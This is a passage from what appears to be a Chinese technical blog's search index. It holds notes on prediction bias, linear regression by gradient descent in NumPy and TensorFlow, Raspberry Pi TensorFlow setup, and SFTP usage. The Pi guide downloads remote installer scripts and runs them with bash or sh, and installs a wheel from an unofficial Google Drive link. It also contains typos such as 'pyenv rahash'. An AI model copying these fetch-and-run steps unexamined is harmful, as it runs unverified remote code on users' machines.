<h2 id="预测偏差"><a href="#预测偏差" class="headerlink" title="预测偏差"></a>预测偏差</h2><p>逻辑回归预测应当无偏差。即:<br>$$ \text{预测平均值}\approx\text{观察平均值}$$<br>预测偏差指的是这两个平均值之间的差值。即：<br>$$\text{预测偏差} = \text{预测平均值} - \text{数据集中相应标签的平均值}$$</p>
<p>造成预测偏差的可能原因包括：</p>
<ul>
<li>特征集不完整</li>
<li>数据集混乱</li>
<li>模型实现流水线中有错误？</li>
<li>训练样本有偏差</li>
<li>正则化过强</li>
</ul>
<h1 id="端到端（end-to-end）"><a href="#端到端（end-to-end）" class="headerlink" title="端到端（end to end）"></a>端到端（end to end）</h1><p>传统机器学习算法在应用过程中需要经历<strong>特征工程</strong>这一步骤，从研究对象中提取特征信息，便于后续的训练和测试。在传统机器学习中，<strong>特征工程</strong>非常重要，它提取特征的好坏关系到机器学习的最终效果。</p>
<p>本质上，<strong>特征工程</strong>是将研究对象信息降维的过程。而深度学习则无需这一手工提取特征的过程。以深度学习在图像分类中的应用为例，它直接输入高维的原始图像，输出即是图像分类。这个过程即叫做端到端。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/机器学习" target="_blank" rel="noopener">机器学习</a>，by wikipedia.</li>
<li><a href="https://developers.google.com/machine-learning/crash-course/ml-intro?hl=zh-cn" target="_blank" rel="noopener">机器学习速成课程</a>，by google.</li>
<li><a href="https://www.zybuluo.com/knight/note/96093" target="_blank" rel="noopener">MathJax使用LaTeX语法编写数学公式教程</a></li>
<li><a href="https://www.zhihu.com/question/51435499" target="_blank" rel="noopener">什么是 end-to-end 神经网络？</a>,by zhihu.</li>
<li><a href="https://www.shidata.com/2018/01/19/likelihood/" target="_blank" rel="noopener">数学基础——浅谈似然</a>,by shidata.</li>
<li><a href="https://blog.csdn.net/2301_79849925/article/details/144477739" target="_blank" rel="noopener">【机器学习】解构概率，重构世界：贝叶斯定理与智能世界的暗语</a>,by 半截诗​.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习之线性回归问题求解</title>
    <url>/2019/01/12/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92%E9%97%AE%E9%A2%98%E6%B1%82%E8%A7%A3/</url>
    <content><![CDATA[<p>在统计学中，线性回归（Linear regression）是利用称为线性回归方程的最小二乘函数对一个或多个自变量和因变量之间关系进行建模的一种回归分析。这种函数是一个或多个称为回归系数的模型参数的线性组合。只有一个自变量的情况称为简单回归，大于一个自变量情况的叫做多元回归。下面以简单线性回归为例，以机器学习的方法求解此问题。</p>
<h1 id="问题设定"><a href="#问题设定" class="headerlink" title="问题设定"></a>问题设定</h1><p>已知有 $N$ 个 $x, y$ 对构成数据集 $X, Y$ ，他们在坐标轴上的分布如下图：</p>
<p align="center">
    <img src="images/dataset.png" width="80%" alt="数据集"/>
</p>

<p>现在希望找到一个函数：</p>
<p>$$h(x) = wx+b$$</p>
<p>这个函数会尽可能的拟合数据集 $X, Y$ ，为了做到这点，我们希望这个函数 $h(x)$ 在 $X$ 上每一个取值 $x_i$ 的函数值 $h(x_i)$ 与 $Y$ 上每一个对应的 $y_i$ 的平方差尽可能小。即找到一组 $w, b$ ，能使得 $loss(w, b)$ 最小。</p>
<p>$$loss(w, b) = \frac{1}{N}\sum^{N}_{i=0}(wx_i+b-y_i)^2$$</p>
<h1 id="问题求解"><a href="#问题求解" class="headerlink" title="问题求解"></a>问题求解</h1><p>采用梯度下降法找到目标 $w, b$，先随机初始化一对 $w_0, b_0$。由于函数的负梯度方向是函数值下降最快的方向，因此对 $w, b$ 求其偏微分:</p>
<p>$$\begin{aligned} \frac{\partial loss(w, b)}{\partial w} &amp;= \frac{2}{N}\sum^{N}<em>{i=0}(wx_i+b-y_i)\cdot x_i, \ \frac{\partial loss(w, b)}{\partial b} &amp;= \frac{2}{N}\sum^{N}</em>{i=0}(wx_i+b-y_i) \end{aligned}$$</p>
<p>再通过下式在每次迭代中更新 $w, b$ ：</p>
<p>$$\begin{aligned} w_{t+1} &amp;= w_t - \eta \frac{\partial l(w_t, b_t)}{\partial w_t} \ b_{t+1} &amp;= b_t - \eta \frac{\partial l(w_t, b_t)}{\partial b_t} \end{aligned}$$</p>
<p>其中， $\eta$ 是学习率。</p>
<h2 id="python实现"><a href="#python实现" class="headerlink" title="python实现"></a>python实现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line"># %matplotlib inline</span><br><span class="line"></span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"># 生成100对x, y</span><br><span class="line">data_count &#x3D; 100</span><br><span class="line">w_cache, b_cache, l_cache, &#x3D; [], [], []</span><br><span class="line"># 学习速度</span><br><span class="line">learning_rate &#x3D; 0.003</span><br><span class="line"># 迭代次数</span><br><span class="line">training_steps &#x3D; 3000</span><br><span class="line"></span><br><span class="line">x_data &#x3D; np.linspace(-20, 20, data_count)</span><br><span class="line">y_data &#x3D; np.multiply(4, x_data) + 7 + np.random.normal(loc&#x3D;0, scale&#x3D;8.0, size&#x3D;(data_count,))</span><br><span class="line"></span><br><span class="line"># 初始化w和b</span><br><span class="line">w &#x3D; np.random.rand()</span><br><span class="line">b &#x3D; np.random.rand()</span><br><span class="line">y_predict &#x3D; w * x_data + b</span><br><span class="line"></span><br><span class="line"># 梯度下降迭代3000次</span><br><span class="line">for iteration in range(training_steps):</span><br><span class="line">    y_predict &#x3D; w * x_data + b</span><br><span class="line">    diff &#x3D; y_predict - y_data</span><br><span class="line">    error &#x3D; np.sum(np.square(diff)) &#x2F; data_count</span><br><span class="line">    grad_w &#x3D; np.mean(diff * x_data)</span><br><span class="line">    grad_b &#x3D; np.mean(diff)</span><br><span class="line">    w -&#x3D; learning_rate * grad_w</span><br><span class="line">    b -&#x3D; learning_rate * grad_b</span><br><span class="line">    w_cache.append(w)</span><br><span class="line">    b_cache.append(b)</span><br><span class="line">    l_cache.append(error)</span><br><span class="line"></span><br><span class="line">y_predict &#x3D; w * x_data + b</span><br><span class="line"></span><br><span class="line"># 绘制结果</span><br><span class="line">plt.figure(figsize&#x3D;(10, 6))</span><br><span class="line">plt.scatter(x_data, y_data, s&#x3D;10, color&#x3D;&#39;g&#39;)</span><br><span class="line">plt.plot(x_data, y_predict)</span><br><span class="line">plt.title(&#39;y&#x3D;4x+7&#39;)</span><br><span class="line">plt.xlabel(&#39;x&#39;)</span><br><span class="line">plt.ylabel(&#39;y&#39;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<h2 id="tensorflow实现"><a href="#tensorflow实现" class="headerlink" title="tensorflow实现"></a>tensorflow实现</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import tensorflow as tf</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line"># 初始化变量和模型参数，定义训练闭环中的运算</span><br><span class="line"></span><br><span class="line"># 生成100对x, y</span><br><span class="line">data_count &#x3D; 100</span><br><span class="line"></span><br><span class="line"># 超参数，实际的训练迭代次数</span><br><span class="line">training_steps&#x3D;1000</span><br><span class="line"></span><br><span class="line"># 超参数，学习速率</span><br><span class="line">learning_rate&#x3D;0.003</span><br><span class="line"></span><br><span class="line"># 定义tf graph输入</span><br><span class="line">X &#x3D; tf.placeholder(tf.float32)</span><br><span class="line">Y &#x3D; tf.placeholder(tf.float32)</span><br><span class="line"># 定义模型参数</span><br><span class="line">W &#x3D; tf.Variable(np.random.randn(), name&#x3D;&quot;weight&quot;, dtype&#x3D;tf.float32)</span><br><span class="line">b &#x3D; tf.Variable(np.random.randn(), name&#x3D;&quot;bias&quot;, dtype&#x3D;tf.float32)</span><br><span class="line"></span><br><span class="line">def inference(X):</span><br><span class="line">    # 计算推断模型在数据X上的输出，并将结果返回</span><br><span class="line">    pred &#x3D; tf.add(tf.multiply(W, X), b)</span><br><span class="line">    return pred</span><br><span class="line"></span><br><span class="line">def loss(X,Y):</span><br><span class="line">    # 依据训练数据X及其期望输出Y计算损失</span><br><span class="line">    pred &#x3D; tf.add(tf.multiply(W, X), b)</span><br><span class="line">    cost &#x3D; tf.reduce_sum(tf.pow(pred-Y, 2)) &#x2F;  data_count</span><br><span class="line">    return cost</span><br><span class="line"></span><br><span class="line">def inputs():</span><br><span class="line">    # 读取或生成训练数据X及其期望输出Y</span><br><span class="line">    x_data &#x3D; np.linspace(-20, 20, data_count)</span><br><span class="line">    y_data &#x3D; np.multiply(4, x_data) + 7 + np.random.normal(loc&#x3D;0, scale&#x3D;8.0, size&#x3D;(data_count,))</span><br><span class="line">    return (x_data,y_data)</span><br><span class="line"></span><br><span class="line">def train(total_loss):</span><br><span class="line">    # 依据计算的总损失训练或调整模型参数</span><br><span class="line">    optimizer &#x3D; tf.train.GradientDescentOptimizer(learning_rate).minimize(total_loss)</span><br><span class="line">    return optimizer</span><br><span class="line">    </span><br><span class="line">def evaluate(sess,X,Y):</span><br><span class="line">    # 对训练得到的模型进行评估</span><br><span class="line">    # 因为是线性回归，这里只图示</span><br><span class="line">    plt.figure(figsize&#x3D;(10, 6))</span><br><span class="line">    plt.scatter(X, Y, s&#x3D;10, color&#x3D;&#39;g&#39;)</span><br><span class="line">    pred&#x3D;inference(X)</span><br><span class="line">    plt.plot(X, sess.run(pred))</span><br><span class="line">    plt.title(&#39;y&#x3D;4x+7&#39;)</span><br><span class="line">    plt.xlabel(&#39;x&#39;)</span><br><span class="line">    plt.ylabel(&#39;y&#39;)</span><br><span class="line">    plt.show()</span><br><span class="line">    </span><br><span class="line"># 在一个会话对象中启动数据流图，搭建流程</span><br><span class="line">with tf.Session() as sess:</span><br><span class="line">    tf.initialize_all_variables().run()</span><br><span class="line">    </span><br><span class="line">    X,Y&#x3D;inputs()</span><br><span class="line">    </span><br><span class="line">    total_loss&#x3D;loss(X,Y)</span><br><span class="line">    train_op&#x3D;train(total_loss)</span><br><span class="line">    </span><br><span class="line">    coord&#x3D;tf.train.Coordinator()</span><br><span class="line">    threads&#x3D;tf.train.start_queue_runners(sess&#x3D;sess,coord&#x3D;coord)</span><br><span class="line"></span><br><span class="line">    for step in range(training_steps):</span><br><span class="line">        sess.run([train_op])</span><br><span class="line">        # 出于调试和学习的目的，查看损失在训练过程中递减的情况</span><br><span class="line">        if step % 10 &#x3D;&#x3D;0:</span><br><span class="line">            print(&quot;loss: &quot;,sess.run([total_loss]))</span><br><span class="line"></span><br><span class="line">    evaluate(sess,X,Y)</span><br><span class="line"></span><br><span class="line">    coord.request_stop()</span><br><span class="line">    coord.join(threads)</span><br><span class="line">    sess.close()</span><br></pre></td></tr></table></figure>

<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/线性回归" target="_blank" rel="noopener">线性回归</a>, by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/36553041" target="_blank" rel="noopener">重拾基础 - 线性回归（一）</a>, by Cerulean.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
        <tag>tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派中配置tensorflow运行环境</title>
    <url>/2022/05/16/%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%AD%E9%85%8D%E7%BD%AEtensorflow%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<p>本文记录在树莓派3B+上配置tensorflow运行环境的过程。</p>
<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ul>
<li>16G的microsd卡</li>
<li>读卡器</li>
<li>系统映像，如果使用官方的镜像烧录工具，就不需要准备</li>
</ul>
<h1 id="烧录系统"><a href="#烧录系统" class="headerlink" title="烧录系统"></a>烧录系统</h1><p>请参考<a href="https://huangwang.github.io/2018/11/03/%E6%A0%91%E8%8E%93%E6%B4%BE%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F%E7%83%A7%E5%BD%95%E6%96%B9%E6%B3%95%E6%8C%87%E5%8D%97/">树莓派操作系统镜像烧录方法指南</a>。</p>
<p>或者使用官方的系统映像烧录工具<a href="https://www.raspberrypi.com/software/" target="_blank" rel="noopener">Raspberry Pi Imager</a>, 烧录最新的树莓派操作系统。<strong>注意，烧录前配置使用ssh密码登录，并配置连接好wifi。</strong>建议不要使用最新的树莓派操作系统，而是选择legacy，debian10。</p>
<p>启动系统后使用如下命令连接系统：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ssh登录系统</span><br><span class="line">ssh pi@192.168.1.232</span><br><span class="line"># 登录后配置启动vnc服务</span><br><span class="line">sudo raspi-config</span><br></pre></td></tr></table></figure>

<h1 id="配置系统"><a href="#配置系统" class="headerlink" title="配置系统"></a>配置系统</h1><h2 id="tensorflow环境配置"><a href="#tensorflow环境配置" class="headerlink" title="tensorflow环境配置"></a>tensorflow环境配置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m venv tf2_api_env</span><br><span class="line">source tf2_api_env&#x2F;bin&#x2F;activate</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"># 在树莓派下安装tensorflow，执行如下命令</span><br><span class="line">pip install --no-deps tensorflow_aarch64-2.8.0-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl</span><br></pre></td></tr></table></figure>

<h2 id="下载TensorFlow-Models"><a href="#下载TensorFlow-Models" class="headerlink" title="下载TensorFlow Models"></a>下载TensorFlow Models</h2><p>TensorFlow Model Garden。TensorFlow 模型花园是一个存储库，为 TensorFlow 用户提供了许多不同的最先进 (SOTA) 模型和建模解决方案的实现。我们旨在展示建模的最佳实践，以便 TensorFlow 用户可以充分利用 TensorFlow 进行研究和产品开发。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;tensorflow&#x2F;models</span><br></pre></td></tr></table></figure>

<h2 id="安装TensorFlow-Models中的Object-Detection-模块"><a href="#安装TensorFlow-Models中的Object-Detection-模块" class="headerlink" title="安装TensorFlow Models中的Object Detection 模块"></a>安装TensorFlow Models中的Object Detection 模块</h2><p>配置目标检测API目录，以便python能找到object detect api。使用pth文件，将object detect模块的路径添加到python模块的搜索路径中。在python安装目录的Lib\site-packages下创建tensorflow.pth文件，在其中添加Object Detection API文件路径：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建tensorflow.pth文件，输入如下内容</span><br><span class="line">J:\tensorflow\models</span><br><span class="line">J:\tensorflow\models\research</span><br><span class="line">J:\tensorflow\models\research\object_detection</span><br><span class="line">J:\tensorflow\models\research\slim</span><br></pre></td></tr></table></figure>

<h2 id="安装Protobuf，生成python语言的消息协议"><a href="#安装Protobuf，生成python语言的消息协议" class="headerlink" title="安装Protobuf，生成python语言的消息协议"></a>安装Protobuf，生成python语言的消息协议</h2><p>安装Protobuf的过程具体参考<a href="https://blog.51cto.com/stq054188/2891184" target="_blank" rel="noopener">TensorFlow2.x目标检测API安装配置步骤详细教程 Object Detection API with TensorFlow2.x </a>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd models&#x2F;research&#x2F;</span><br><span class="line">protoc&#x2F;bin&#x2F;protoc object_detection&#x2F;protos&#x2F;*.proto --python_out&#x3D;.</span><br></pre></td></tr></table></figure>

<h2 id="修改源"><a href="#修改源" class="headerlink" title="修改源"></a>修改源</h2><p>可选。请参考<a href="https://codeantenna.com/a/ZwyYo6EKW7" target="_blank" rel="noopener">修改树莓派3B+的软件源-Raspbian(stretch)</a>。</p>
<h2 id="配置dhcp"><a href="#配置dhcp" class="headerlink" title="配置dhcp"></a>配置dhcp</h2><p>可选。使用命令sudo leafpad /etc/dhcpcd.conf，修改dhcp配置文件，配置使用静态ip。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">interface wlan0</span><br><span class="line">static ip_address&#x3D;192.168.3.169&#x2F;24</span><br><span class="line">static routers&#x3D;</span><br><span class="line">static domain_name_servers&#x3D;</span><br></pre></td></tr></table></figure>
<h2 id="扩充分区"><a href="#扩充分区" class="headerlink" title="扩充分区"></a>扩充分区</h2><p>可选。请参考<a href="https://blog.csdn.net/ourkix/article/details/109445090" target="_blank" rel="noopener">解决树莓派磁盘没有占满整个sd卡的方法</a>。</p>
<h2 id="上网配置"><a href="#上网配置" class="headerlink" title="上网配置"></a>上网配置</h2><p>可选。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install proxychains</span><br><span class="line">sudo leafpad &#x2F;etc&#x2F;proxychains.conf</span><br></pre></td></tr></table></figure>


<h2 id="安装pyenv"><a href="#安装pyenv" class="headerlink" title="安装pyenv"></a>安装pyenv</h2><p>可选，重点是安装python3.7。在linux操作系统中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget  https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;pyenv&#x2F;pyenv-installer&#x2F;master&#x2F;bin&#x2F;pyenv-installer</span><br><span class="line">bash pyenv-installer</span><br></pre></td></tr></table></figure>

<p>使用命令leafpad .bashrc打开.bashrc文件，在其末尾输入如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PYENV_ROOT&#x3D;&quot;$HOME&#x2F;.pyenv&quot;</span><br><span class="line">command -v pyenv &gt;&#x2F;dev&#x2F;null || export PATH&#x3D;&quot;$PYENV_ROOT&#x2F;bin:$PATH&quot;</span><br><span class="line">eval &quot;$(pyenv init -)&quot;</span><br></pre></td></tr></table></figure>

<p>安装python 3.7.3:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y make build-essential libssl-dev zlib1g-dev libbz2-dev \</span><br><span class="line">libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev \</span><br><span class="line">xz-utils tk-dev libffi-dev liblzma-dev libatlas-base-dev libjasper-dev libqtgui4 libqt4-test</span><br><span class="line"></span><br><span class="line"># pyenv install build failed:Fatal: You must get working getaddrinfo() function</span><br><span class="line">PYTHON_CONFIGURE_OPTS&#x3D;&quot;--disable-ipv6&quot; proxychains pyenv install 3.7.3</span><br><span class="line">pyenv global 3.7.3</span><br><span class="line">pyenv rahash</span><br><span class="line"></span><br><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure>

<h2 id="使用含tensorflow环境的Docker映像"><a href="#使用含tensorflow环境的Docker映像" class="headerlink" title="使用含tensorflow环境的Docker映像"></a>使用含tensorflow环境的Docker映像</h2><p>可选。使用如下命令在树莓派上安装docker：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;get.docker.com -o get-docker.sh</span><br><span class="line">Sudo sh get-docker.sh</span><br><span class="line"># 将非root用户添加到docker组</span><br><span class="line">sudo usermod -aG docker $&#123;USER&#125;</span><br><span class="line">groups $&#123;USER&#125;</span><br></pre></td></tr></table></figure>

<p>使用如下命令下载含tensorflow环境的docker映像：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull armswdev&#x2F;tensorflow-arm-neoverse:r22.05-tf-2.8.0-eigen</span><br></pre></td></tr></table></figure>
<p>使用如下命令启动docker容器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 注意-v等所有选项必须在image之前</span><br><span class="line">docker run -it --rm --name tf2_api_test -v &#x2F;home&#x2F;pi&#x2F;tensorflow:&#x2F;home&#x2F;pi&#x2F;tensorflow armswdev&#x2F;tensorflow-arm-neoverse:r22.05-tf-2.8.0-eigen</span><br></pre></td></tr></table></figure>
<p>具体使用过程请参考<a href="https://www.tensorflow.org/tfx/serving/docker" target="_blank" rel="noopener">TensorFlow Serving with Docker </a>。</p>
<h1 id="模型测试"><a href="#模型测试" class="headerlink" title="模型测试"></a>模型测试</h1><h2 id="传输模型"><a href="#传输模型" class="headerlink" title="传输模型"></a>传输模型</h2><h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>可选。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建虚拟环境</span><br><span class="line">python3 -m venv tf2_api_env</span><br><span class="line">source tf2_api_env&#x2F;bin&#x2F;activate</span><br><span class="line"># 下载并安装tensorflow 2.2</span><br><span class="line">gdown https:&#x2F;&#x2F;drive.google.com&#x2F;uc?id&#x3D;11mujzVaFqa7R1_lB7q0kVPW22Ol51MPg</span><br><span class="line">pip install --proxy&#x3D;X.X.X.X:X tensorflow-2.2.0-cp37-cp37m-linux_armv7l.whl</span><br><span class="line"># 安装tensorflow_io, object-detection需要</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;tensorflow&#x2F;io.git</span><br><span class="line">cd io</span><br><span class="line">git checkout v0.15.0</span><br><span class="line">pip install -e .</span><br><span class="line"># 安装object-detection</span><br><span class="line"># From within TensorFlow&#x2F;models&#x2F;research&#x2F;</span><br><span class="line">cp object_detection&#x2F;packages&#x2F;tf2&#x2F;setup.py .</span><br><span class="line">pip install -e . -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;</span><br><span class="line"># or</span><br><span class="line">pip install object_detection -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;</span><br><span class="line"># 安装opencv</span><br><span class="line">sudo apt-get install libatlas-base-dev</span><br><span class="line">pip install opencv-python</span><br></pre></td></tr></table></figure>

<h2 id="测试模型"><a href="#测试模型" class="headerlink" title="测试模型"></a>测试模型</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 进入虚拟环境</span><br><span class="line">source tf2_api_env&#x2F;bin&#x2F;activate</span><br><span class="line"># 测试图像处理</span><br><span class="line">python image_process_test.py</span><br><span class="line"># 测试视频处理</span><br><span class="line">python video_read_test.py</span><br><span class="line"># 测试摄像头</span><br><span class="line">python camera_open_test.py</span><br><span class="line"># 测试图像目标检测</span><br><span class="line">python object_detection_plot.py</span><br><span class="line"># 测试视频目标检测</span><br><span class="line">python object_detection_camera.py</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://medium.com/@abhizc/installing-latest-tensor-flow-and-keras-on-raspberry-pi-aac7dbf95f2" target="_blank" rel="noopener">Installing Latest Tensor flow and Keras on RASPBERRY PI</a>,by Abhishek c.</li>
<li><a href="https://askubuntu.com/questions/926911/unable-to-uninstall-programs-using-sudo-pip" target="_blank" rel="noopener">Unable to uninstall programs using sudo pip</a>,by askubuntu.</li>
<li><a href="https://itnext.io/installing-tensorflow-2-3-0-for-raspberry-pi3-4-debian-buster-11447cb31fc4" target="_blank" rel="noopener">Installing TensorFlow 2.3.0 for Raspberry Pi3+/4 (Debian Buster)</a>,by Cawin Chan.</li>
<li><a href="https://zhuanlan.zhihu.com/p/101089893" target="_blank" rel="noopener">树莓派开启wifi热点</a>,by zsssj.</li>
<li><a href="https://codeantenna.com/a/ZwyYo6EKW7" target="_blank" rel="noopener">修改树莓派3B+的软件源-Raspbian(stretch)</a>,by codeantenna.</li>
<li><a href="https://www.cnblogs.com/jiechn/p/4494958.html" target="_blank" rel="noopener">磁盘分区——主分区、扩展分区、逻辑分区</a>,by ITCHN.</li>
<li><a href="https://blog.csdn.net/ourkix/article/details/109445090" target="_blank" rel="noopener">解决树莓派磁盘没有占满整个sd卡的方法</a>,by ourkix.</li>
<li><a href="https://blog.csdn.net/bigtiger1648/article/details/69676933" target="_blank" rel="noopener">centos下python环境搭建</a>,by bigtiger1648.</li>
<li><a href="https://blog.csdn.net/yaoyutian/article/details/87449649" target="_blank" rel="noopener">Linux/树莓派raspbian 32/64查看</a>,by Yew1168.</li>
<li><a href="https://blog.csdn.net/weixin_39450145/article/details/104801730" target="_blank" rel="noopener">ModuleNotFoundError: No module named ‘cv2’ （安装cv2）</a>,by weixin_39450145.</li>
<li><a href="https://www.tensorflow.org/tfx/serving/docker" target="_blank" rel="noopener">TensorFlow Serving with Docker </a>,by tensorflow.</li>
<li><a href="https://biningo.github.io/2021/01/07/docker%E7%9A%84volumes%E8%B8%A9%E5%9D%91/" target="_blank" rel="noopener">Docker的volumes踩坑</a>,by lyer.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>硬件</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>树莓派学习之SFTP管理文件</title>
    <url>/2018/11/09/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AD%A6%E4%B9%A0%E4%B9%8BSFTP%E7%AE%A1%E7%90%86%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p>当需要向树莓派发送文件时，可使用SFTP上传下载文件。下面介绍如何使用SFTP向树莓派发送下载文件。</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>SFTP是Secure File Transfer Protocol的缩写，安全文件传送协议。可以为传输文件提供一种安全的网络的加密方法。sftp 与 ftp 有着几乎一样的语法和功能。</p>
<p>SFTP 为 SSH的其中一部分，是一种传输文件至服务器的安全方式。在SSH软件包中，已经包含了一个叫作SFTP(Secure File Transfer Protocol)的安全文件信息传输子系统，SFTP本身没有单独的守护进程，它必须使用sshd守护进程（端口号默认是22）来完成相应的连接和答复操作。</p>
<p>SFTP传输使用了加密/解密技术，所以传输效率比普通的FTP要低得多，如果您对网络安全性要求更高时，可以使用SFTP代替FTP。</p>
<h2 id="SFTP客户端程序"><a href="#SFTP客户端程序" class="headerlink" title="SFTP客户端程序"></a>SFTP客户端程序</h2><p>在Windows平台，常用的SFTP客户端程序有：</p>
<ul>
<li>FileZilla</li>
<li>WinSCP</li>
<li>Xftp</li>
<li>Core FTP</li>
</ul>
<p>在Linux平台，可直接使用sftp命令进行连接服务器。</p>
<h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><p>下面介绍在Debian平台使用sftp命令连接树莓派，<strong>在此之前应配置树莓派开启ssh服务</strong>。</p>
<ol>
<li>建立连接</li>
</ol>
<p>使用如下命令连接树莓派：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sftp pi@192.168.0.103</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看帮助</li>
</ol>
<p>通过help查看在sftp连接下能使用的命令。从帮助中可知，在命令前加前缀“l”或者“！”即可在本地操作系统shell执行命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sftp&gt; help</span><br><span class="line">Available commands:</span><br><span class="line">bye                                Quit sftp</span><br><span class="line">cd path                            Change remote directory to &#39;path&#39;</span><br><span class="line">chgrp grp path                     Change group of file &#39;path&#39; to &#39;grp&#39;</span><br><span class="line">chmod mode path                    Change permissions of file &#39;path&#39; to &#39;mode&#39;</span><br><span class="line">chown own path                     Change owner of file &#39;path&#39; to &#39;own&#39;</span><br><span class="line">df [-hi] [path]                    Display statistics for current directory or</span><br><span class="line">                                   filesystem containing &#39;path&#39;</span><br><span class="line">exit                               Quit sftp</span><br><span class="line">get [-afPpRr] remote [local]       Download file</span><br><span class="line">reget [-fPpRr] remote [local]      Resume download file</span><br><span class="line">reput [-fPpRr] [local] remote      Resume upload file</span><br><span class="line">help                               Display this help text</span><br><span class="line">lcd path                           Change local directory to &#39;path&#39;</span><br><span class="line">lls [ls-options [path]]            Display local directory listing</span><br><span class="line">lmkdir path                        Create local directory</span><br><span class="line">ln [-s] oldpath newpath            Link remote file (-s for symlink)</span><br><span class="line">lpwd                               Print local working directory</span><br><span class="line">ls [-1afhlnrSt] [path]             Display remote directory listing</span><br><span class="line">lumask umask                       Set local umask to &#39;umask&#39;</span><br><span class="line">mkdir path                         Create remote directory</span><br><span class="line">progress                           Toggle display of progress meter</span><br><span class="line">put [-afPpRr] local [remote]       Upload file</span><br><span class="line">pwd                                Display remote working directory</span><br><span class="line">quit                               Quit sftp</span><br><span class="line">rename oldpath newpath             Rename remote file</span><br><span class="line">rm path                            Delete remote file</span><br><span class="line">rmdir path                         Remove remote directory</span><br><span class="line">symlink oldpath newpath            Symlink remote file</span><br><span class="line">version                            Show SFTP version</span><br><span class="line">!command                           Execute &#39;command&#39; in local shell</span><br><span class="line">!                                  Escape to local shell</span><br><span class="line">?                                  Synonym for help</span><br></pre></td></tr></table></figure>
<ol start="3">
<li><p>下载远程文件到本地主机<br>使用get命令下载远程文件到本地主机：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sftp&gt; get README.TXT </span><br><span class="line">Fetching &#x2F;home&#x2F;pi&#x2F;wiringPi&#x2F;README.TXT to README.TXT</span><br><span class="line">&#x2F;home&#x2F;pi&#x2F;wiringPi&#x2F;README.TXT                  100%  606    39.1KB&#x2F;s   00:00</span><br></pre></td></tr></table></figure>
<p>get命令还有一些有用参数，如递归选项“ -r ”来递归的复制一个文件夹里面的内容，“ -P ”或者“ -p ”参数来告诉 SFTP 保持文件的权限访问位的设置和访问时间。</p>
</li>
<li><p>上传本地文件到远程主机<br>使用“ put ”命令将文件上传到远程主机：</p>
